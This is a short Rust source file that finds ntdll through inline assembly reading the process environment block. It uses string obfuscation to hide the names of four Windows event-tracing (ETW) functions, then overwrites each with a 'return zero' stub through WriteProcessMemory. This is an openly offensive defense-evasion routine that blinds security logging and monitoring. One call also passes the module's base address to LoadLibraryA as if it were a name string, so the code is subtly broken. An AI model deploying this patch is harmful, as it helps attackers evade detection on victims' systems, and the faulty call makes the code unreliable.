use std::arch::asm;
use std::mem;
use std::mem::transmute;
use std::ptr::null_mut;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::ctypes::c_void;
use ntapi::ntpsapi::NtCurrentProcess;
use obfstr::obfstr;

#[inline(never)]
unsafe fn get_ntdll_asm() -> usize {
    let mut ntdll_base: usize = 0;
    asm!(
        r#"
        xor rax, rax
        mov rax, gs:[0x60]
        mov rax, [rax + 0x18]
        mov rax, [rax + 0x20]
        mov rax, [rax]
        mov rax, [rax + 0x20]
        "#,
        lateout("rax") ntdll_base,
        options(nostack)
    );
    ntdll_base
}

pub fn patch_process() {
    unsafe {
        let ntdll_base_asm = get_ntdll_asm();
        println!("La dirección base de ntdll.dll (ASM): 0x{:x}", ntdll_base_asm);
        let ntdll_module: *mut std::os::raw::c_void = transmute::<usize, *mut std::os::raw::c_void>(ntdll_base_asm) as _;
        let library = LoadLibraryA(ntdll_module as *const i8);
        let mthd = [
            obfstr::obfstr!("EtwEventWrite\0"),
            obfstr::obfstr!("EtwNotificationRegister\0"),
            obfstr::obfstr!("EtwEventRegister\0"),
            obfstr::obfstr!("EtwEventWriteFull\0"),
        ];
        for fun in mthd {
            let mini = GetProcAddress(library, fun.as_ptr() as *const i8);
            let hook = b"\x48\x33\xc0\xc3";
            WriteProcessMemory(NtCurrentProcess, mini as *mut c_void, hook.as_ptr() as _, hook.len(), null_mut());
        }
    }
}
